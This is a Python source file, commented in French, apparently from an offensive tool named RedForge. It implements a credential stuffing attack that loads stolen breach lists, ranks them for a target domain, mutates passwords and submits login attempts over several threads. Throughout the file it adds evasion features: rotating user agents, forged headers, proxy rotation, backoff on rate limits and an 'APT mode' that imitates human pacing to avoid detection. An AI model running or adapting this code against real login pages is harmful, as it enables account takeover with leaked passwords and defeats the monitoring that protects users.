#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Module de credential stuffing pour RedForge
Teste des listes de credentials volés sur la cible
Version avec support furtif, APT et traitement intelligent des fuites
"""

import time
import random
import requests
import hashlib
from typing import Dict, Any, List, Optional, Tuple, Set
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from collections import defaultdict
from urllib.parse import urlparse
import re
import json

@dataclass
class CredentialStuffingConfig:
    """Configuration avancée pour le credential stuffing"""
    # Délais
    delay_between_requests: Tuple[float, float] = (0.5, 2.0)
    delay_between_batches: Tuple[float, float] = (2, 10)
    
    # Threading
    max_threads: int = 5
    batch_size: int = 20
    
    # Comportement
    stop_on_first: bool = True
    prioritize_recent_breaches: bool = True
    test_variations: bool = True
    
    # Furtivité
    stealth_headers: bool = True
    random_user_agents: bool = True
    random_delays: bool = True
    respect_rate_limits: bool = True
    
    # APT
    apt_mode: bool = False
    human_behavior: bool = False
    ip_rotation: bool = False
    
    # Proxies
    proxies: List[str] = field(default_factory=list)
    proxy_rotation: bool = False
    
    # Filtrage
    min_password_length: int = 4
    max_password_length: int = 128
    exclude_common_patterns: bool = True


class CredentialStuffing:
    """Attaque par credential stuffing avec support avancé"""
    
    def __init__(self, config: Optional[CredentialStuffingConfig] = None):
        """
        Initialise l'attaque de credential stuffing
        
        Args:
            config: Configuration personnalisée
        """
        self.config = config or CredentialStuffingConfig()
        
        # Base de données de credentials (structurée par fuite)
        self.breach_databases = {}
        self.default_breached_credentials = []
        
        # Statistiques des fuites (pertinence par domaine)
        self.breach_relevance = defaultdict(float)
        
        # Cache des tentatives pour éviter les doublons
        self.attempt_cache: Set[str] = set()
        
        # Métriques
        self.attempts_count = 0
        self.success_count = 0
        self.rate_limit_hits = 0
        self.start_time = None
        
        # User agents pour la furtivité
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; rv:90.0) Gecko/20100101 Firefox/90.0',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1'
        ]
        
        # Patterns pour générer des variations
        self.variation_patterns = [
            lambda u, p: (u, p + "123"),
            lambda u, p: (u, p + "!"),
            lambda u, p: (u, p.capitalize()),
            lambda u, p: (u.lower(), p),
            lambda u, p: (u, p + p[-2:]),
            lambda u, p: (u.split('@')[0], p),  # Email -> username
        ]
    
    def scan(self, target: str, **kwargs) -> Dict[str, Any]:
        """
        Exécute une attaque de credential stuffing
        
        Args:
            target: URL cible
            **kwargs: Options de configuration
                - credentials_file: Fichier contenant les credentials
                - breach_files: Liste de fichiers de fuites
                - username_field: Nom du champ username
                - password_field: Nom du champ password
                - threads: Nombre de threads
                - delay: Délai entre les tentatives
                - stop_on_find: Arrêter à la première découverte
                - test_variations: Tester les variations des credentials
                - domain: Domaine cible (pour filtrer les emails)
        """
        self.start_time = time.time()
        self.attempts_count = 0
        self.success_count = 0
        self.attempt_cache.clear()
        
        # Mettre à jour la configuration
        self._update_config(kwargs)
        
        print(f"  → Credential stuffing sur {target}")
        if self.config.apt_mode:
            print(f"  🕵️ Mode APT activé - Test ultra discret")
        
        found_credentials = []
        
        # Récupérer les credentials
        credentials = self._get_credentials(kwargs)
        
        # Filtrer les credentials pertinents pour la cible
        domain = kwargs.get('domain', urlparse(target).netloc)
        filtered_creds = self._filter_credentials(credentials, domain)
        
        # Trier par pertinence
        if self.config.prioritize_recent_breaches:
            filtered_creds = self._prioritize_credentials(filtered_creds, domain)
        
        username_field = kwargs.get('username_field', 'username')
        password_field = kwargs.get('password_field', 'password')
        
        total_to_test = len(filtered_creds)
        print(f"    → Test de {total_to_test} credentials (après filtrage)")
        
        if self.config.test_variations:
            variations_count = len(filtered_creds) * len(self.variation_patterns)
            print(f"    → + {variations_count} variations à tester")
        
        # Traitement par lots
        for i in range(0, len(filtered_creds), self.config.batch_size):
            batch = filtered_creds[i:i + self.config.batch_size]
            
            # Vérifier les rate limits
            if self.config.respect_rate_limits and self.rate_limit_hits > 3:
                print(f"    ⚠️ Rate limit détecté, pause prolongée...")
                time.sleep(random.uniform(60, 180))
                self.rate_limit_hits = 0
            
            # Pause entre les lots
            if i > 0:
                if self.config.apt_mode and self.config.human_behavior:
                    self._apt_pause()
                else:
                    delay = random.uniform(*self.config.delay_between_batches)
                    time.sleep(delay)
            
            batch_results = self._process_batch(
                target, batch, username_field, password_field, **kwargs
            )
            
            for result in batch_results:
                if result['success']:
                    found_credentials.append({
                        "username": result['username'],
                        "password": result['password'],
                        "status_code": result.get('status_code'),
                        "response_time": result.get('response_time'),
                        "breach_source": result.get('breach_source', 'unknown'),
                        "method": "direct"
                    })
                    print(f"      ✓ Credential valide: {result['username']}:{result['password']}")
                    
                    # Tester les variations si trouvé
                    if self.config.test_variations:
                        variations = self._generate_variations(
                            result['username'], result['password']
                        )
                        for var_user, var_pass in variations:
                            if self._is_unique_attempt(var_user, var_pass):
                                var_result = self._test_login(
                                    target, var_user, var_pass,
                                    username_field, password_field
                                )
                                if var_result['success']:
                                    found_credentials.append({
                                        "username": var_user,
                                        "password": var_pass,
                                        "method": "variation"
                                    })
                                    print(f"      ✓ Variation valide: {var_user}:{var_pass}")
                    
                    if self.config.stop_on_first:
                        return self._generate_results(target, found_credentials)
        
        return self._generate_results(target, found_credentials)
    
    def _update_config(self, kwargs: Dict):
        """Met à jour la configuration avec les kwargs"""
        if 'threads' in kwargs:
            self.config.max_threads = kwargs['threads']
        if 'delay' in kwargs:
            self.config.delay_between_requests = (kwargs['delay'], kwargs['delay'] * 2)
        if 'stop_on_find' in kwargs:
            self.config.stop_on_first = kwargs['stop_on_find']
        if 'test_variations' in kwargs:
            self.config.test_variations = kwargs['test_variations']
        
        # Mode furtif
        if kwargs.get('stealth_mode', False):
            self.config.stealth_headers = True
            self.config.random_user_agents = True
            self.config.random_delays = True
            self.config.max_threads = min(self.config.max_threads, 3)
        
        # Mode APT
        if kwargs.get('apt_mode', False) or kwargs.get('stealth_level') == 'apt':
            self.config.apt_mode = True
            self.config.human_behavior = True
            self.config.stealth_headers = True
            self.config.random_delays = True
            self.config.max_threads = 1
            self.config.delay_between_requests = (5, 15)
            self.config.delay_between_batches = (30, 180)
    
    def _get_credentials(self, kwargs: Dict) -> List[Tuple[str, str]]:
        """Récupère la liste des credentials à tester"""
        credentials = []
        
        # Depuis un fichier unique
        if kwargs.get('credentials_file'):
            creds = self._load_credentials_file(kwargs['credentials_file'])
            credentials.extend(creds)
        
        # Depuis plusieurs fichiers de fuites
        if kwargs.get('breach_files'):
            for breach_file in kwargs['breach_files']:
                creds = self._load_breach_file(breach_file)
                credentials.extend(creds)
                self.breach_databases[breach_file] = creds
        
        # Credentials uniques
        if kwargs.get('username') and kwargs.get('password'):
            credentials.append((kwargs['username'], kwargs['password']))
        
        # Credentials par défaut
        if not credentials:
            credentials = self.default_breached_credentials.copy()
        
        # Supprimer les doublons
        credentials = list(set(credentials))
        
        return credentials
    
    def _load_credentials_file(self, filepath: str) -> List[Tuple[str, str]]:
        """Charge un fichier de credentials"""
        credentials = []
        try:
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    line = line.strip()
                    if not line:
                        continue
                    
                    # Support de différents formats
                    if ':' in line:
                        user, pwd = line.split(':', 1)
                        credentials.append((user, pwd))
                    elif ',' in line:
                        user, pwd = line.split(',', 1)
                        credentials.append((user, pwd))
                    elif '\t' in line:
                        user, pwd = line.split('\t', 1)
                        credentials.append((user, pwd))
                    else:
                        # Format username seulement? Ignorer
                        continue
            
            print(f"    → Chargé {len(credentials)} credentials depuis {filepath}")
        except Exception as e:
            print(f"    ⚠️ Erreur chargement {filepath}: {e}")
        
        return credentials
    
    def _load_breach_file(self, breach_file: str) -> List[Tuple[str, str]]:
        """Charge un fichier de fuite avec métadonnées"""
        credentials = self._load_credentials_file(breach_file)
        
        # Extraire le nom de la fuite du nom de fichier
        breach_name = breach_file.split('/')[-1].replace('.txt', '').replace('.csv', '')
        
        # Mettre à jour la pertinence (simulée - à améliorer avec des données réelles)
        self.breach_relevance[breach_name] = random.uniform(0.5, 1.0)
        
        return credentials
    
    def _filter_credentials(self, credentials: List[Tuple[str, str]], 
                           domain: str) -> List[Tuple[str, str]]:
        """Filtre les credentials pertinents pour la cible"""
        filtered = []
        
        for username, password in credentials:
            # Vérifier la longueur du mot de passe
            if len(password) < self.config.min_password_length:
                continue
            if len(password) > self.config.max_password_length:
                continue
            
            # Filtrer par domaine (si email)
            if '@' in username:
                user_domain = username.split('@')[1]
                # Accepter si le domaine correspond ou si c'est un domaine public
                if user_domain != domain and user_domain not in ['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com']:
                    continue
            
            filtered.append((username, password))
        
        print(f"    → Filtrage: {len(credentials)} -> {len(filtered)} credentials")
        return filtered
    
    def _prioritize_credentials(self, credentials: List[Tuple[str, str]], 
                               domain: str) -> List[Tuple[str, str]]:
        """Priorise les credentials par pertinence"""
        # Calculer un score pour chaque credential
        scored_creds = []
        
        for username, password in credentials:
            score = 0
            
            # Plus de poids si le domaine correspond
            if '@' in username and username.split('@')[1] == domain:
                score += 10
            
            # Mots de passe forts = plus susceptibles d'être réutilisés
            if len(password) > 8:
                score += 2
            if any(c.isupper() for c in password):
                score += 1
            if any(c.isdigit() for c in password):
                score += 1
            
            # Username commun
            common_users = ['admin', 'root', 'user', 'test', 'administrator']
            if username.lower() in common_users:
                score += 5
            
            scored_creds.append((score, username, password))
        
        # Trier par score décroissant
        scored_creds.sort(key=lambda x: x[0], reverse=True)
        
        return [(u, p) for _, u, p in scored_creds]
    
    def _process_batch(self, target: str, batch: List[Tuple[str, str]],
                      username_field: str, password_field: str,
                      **kwargs) -> List[Dict]:
        """Traite un lot de credentials"""
        results = []
        
        with ThreadPoolExecutor(max_workers=self.config.max_threads) as executor:
            futures = {}
            
            for username, password in batch:
                # Vérifier le cache
                if not self._is_unique_attempt(username, password):
                    continue
                
                future = executor.submit(
                    self._test_login, target, username, password,
                    username_field, password_field
                )
                futures[future] = (username, password)
                
                # Délai entre les requêtes
                if self.config.random_delays:
                    delay = random.uniform(*self.config.delay_between_requests)
                else:
                    delay = self.config.delay_between_requests[1]
                
                time.sleep(delay)
            
            for future in as_completed(futures):
                username, password = futures[future]
                result = future.result()
                result['username'] = username
                result['password'] = password
                results.append(result)
                
                self.attempts_count += 1
                if result['success']:
                    self.success_count += 1
        
        return results
    
    def _test_login(self, target: str, username: str, password: str,
                    username_field: str, password_field: str) -> Dict[str, Any]:
        """
        Teste un credential sur la cible avec options furtives
        """
        result = {
            "success": False,
            "username": username,
            "password": password,
            "status_code": None,
            "response_time": None
        }
        
        try:
            session = requests.Session()
            
            # Headers furtifs
            headers = {
                'User-Agent': random.choice(self.user_agents) if self.config.random_user_agents else self.user_agents[0],
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache'
            }
            
            if self.config.stealth_headers:
                headers['Referer'] = target
                headers['Origin'] = urlparse(target).scheme + '://' + urlparse(target).netloc
            
            data = {
                username_field: username,
                password_field: password
            }
            
            # Ajouter un token CSRF si nécessaire
            csrf_token = self._extract_csrf_token(target, session)
            if csrf_token:
                data['csrf_token'] = csrf_token
                data['authenticity_token'] = csrf_token
            
            # Mesurer le temps de réponse
            start_time = time.time()
            response = session.post(
                target, data=data, headers=headers,
                timeout=10, verify=False, allow_redirects=False
            )
            result["response_time"] = time.time() - start_time
            result["status_code"] = response.status_code
            
            # Détection avancée de succès
            result["success"] = self._is_login_successful(response)
            
            # Rate limiting
            if response.status_code == 429 or 'too many' in response.text.lower():
                self.rate_limit_hits += 1
                
        except requests.exceptions.Timeout:
            result["error"] = "Timeout"
        except requests.exceptions.ConnectionError:
            result["error"] = "Connection error"
        except Exception as e:
            result["error"] = str(e)
        
        return result
    
    def _is_login_successful(self, response: requests.Response) -> bool:
        """Détermine si le login a réussi"""
        success_indicators = [
            response.status_code == 302,
            'dashboard' in response.text.lower(),
            'welcome' in response.text.lower(),
            'success' in response.text.lower(),
            'logged in' in response.text.lower(),
            'redirect' in response.headers.get('Location', '').lower(),
            'home' in response.text.lower() and 'login' not in response.text.lower()
        ]
        
        failure_indicators = [
            'invalid' in response.text.lower(),
            'incorrect' in response.text.lower(),
            'failed' in response.text.lower(),
            'error' in response.text.lower(),
            'try again' in response.text.lower(),
            'wrong' in response.text.lower()
        ]
        
        success_score = sum(1 for ind in success_indicators if ind)
        failure_score = sum(1 for ind in failure_indicators if ind)
        
        return success_score > 0 and failure_score == 0
    
    def _extract_csrf_token(self, target: str, session: requests.Session) -> Optional[str]:
        """Extrait un token CSRF de la page de login"""
        try:
            response = session.get(target, timeout=5, verify=False)
            
            patterns = [
                r'name="csrf_token"\s+value="([^"]+)"',
                r'name="csrf"\s+value="([^"]+)"',
                r'name="_token"\s+value="([^"]+)"',
                r'name="authenticity_token"\s+value="([^"]+)"',
                r'data-csrf="([^"]+)"',
                r'csrf-token" content="([^"]+)"'
            ]
            
            for pattern in patterns:
                match = re.search(pattern, response.text, re.IGNORECASE)
                if match:
                    return match.group(1)
        except:
            pass
        
        return None
    
    def _generate_variations(self, username: str, password: str) -> List[Tuple[str, str]]:
        """Génère des variations d'un credential"""
        variations = []
        
        for pattern in self.variation_patterns:
            try:
                var_user, var_pass = pattern(username, password)
                if (var_user, var_pass) != (username, password):
                    variations.append((var_user, var_pass))
            except:
                continue
        
        return variations[:10]  # Limiter les variations
    
    def _is_unique_attempt(self, username: str, password: str) -> bool:
        """Vérifie si une tentative est unique"""
        key = f"{username}:{password}"
        if key in self.attempt_cache:
            return False
        
        # Hachage pour stockage efficace
        self.attempt_cache.add(key)
        return True
    
    def _apt_pause(self):
        """Pause APT pour simuler un comportement humain"""
        if random.random() < 0.3:
            pause_duration = random.uniform(30, 180)
            print(f"      💤 Pause APT: {pause_duration:.0f}s")
            time.sleep(pause_duration)
    
    def _generate_results(self, target: str, 
                         found_credentials: List[Dict]) -> Dict[str, Any]:
        """Génère les résultats de l'attaque"""
        duration = time.time() - self.start_time
        
        results = {
            "target": target,
            "found_credentials": found_credentials,
            "total_tested": self.attempts_count,
            "successful_attempts": len(found_credentials),
            "duration_seconds": duration,
            "attempts_per_second": self.attempts_count / duration if duration > 0 else 0,
            "rate_limit_hits": self.rate_limit_hits,
            "success_rate": (len(found_credentials) / self.attempts_count * 100) if self.attempts_count > 0 else 0,
            "config": {
                "apt_mode": self.config.apt_mode,
                "test_variations": self.config.test_variations,
                "max_threads": self.config.max_threads
            },
            "summary": self._generate_summary(found_credentials)
        }
        
        return results
    
    def _generate_summary(self, found_credentials: List[Dict]) -> Dict[str, Any]:
        """Génère un résumé des résultats"""
        return {
            "total_found": len(found_credentials),
            "severity": "CRITICAL" if len(found_credentials) > 0 else "INFO",
            "credentials": [
                {
                    "username": cred['username'],
                    "password": cred['password'][:3] + "***" if len(cred['password']) > 6 else "***",
                    "method": cred.get('method', 'direct')
                }
                for cred in found_credentials[:5]  # Limiter pour sécurité
            ]
        }
    
    def load_breach_database(self, breach_file: str, breach_name: Optional[str] = None) -> bool:
        """
        Charge une base de données de fuites
        
        Args:
            breach_file: Fichier contenant les credentials
            breach_name: Nom de la fuite (optionnel)
        """
        try:
            credentials = self._load_credentials_file(breach_file)
            if credentials:
                name = breach_name or breach_file.split('/')[-1].replace('.txt', '')
                self.breach_databases[name] = credentials
                self.default_breached_credentials.extend(credentials)
                print(f"✓ Fuite chargée: {name} ({len(credentials)} credentials)")
                return True
        except Exception as e:
            print(f"✗ Erreur chargement fuite: {e}")
        
        return False
    
    def get_statistics(self) -> Dict[str, Any]:
        """Retourne les statistiques de l'attaque"""
        return {
            "total_breaches_loaded": len(self.breach_databases),
            "total_credentials_available": sum(len(creds) for creds in self.breach_databases.values()),
            "attempts_made": self.attempts_count,
            "successes": self.success_count,
            "rate_limit_hits": self.rate_limit_hits
        }


# Point d'entrée pour tests
if __name__ == "__main__":
    # Test mode normal
    print("=== Test mode normal ===")
    cs = CredentialStuffing()
    results = cs.scan("https://example.com/login", credentials_file="breached.txt")
    print(f"Credentials valides trouvés: {len(results['found_credentials'])}")
    
    # Test mode APT
    print("\n=== Test mode APT ===")
    apt_config = CredentialStuffingConfig(apt_mode=True, human_behavior=True)
    cs_apt = CredentialStuffing(config=apt_config)
    results_apt = cs_apt.scan("https://example.com/login", breach_files=["breach1.txt", "breach2.txt"])
    print(f"Credentials valides trouvés (APT): {len(results_apt['found_credentials'])}")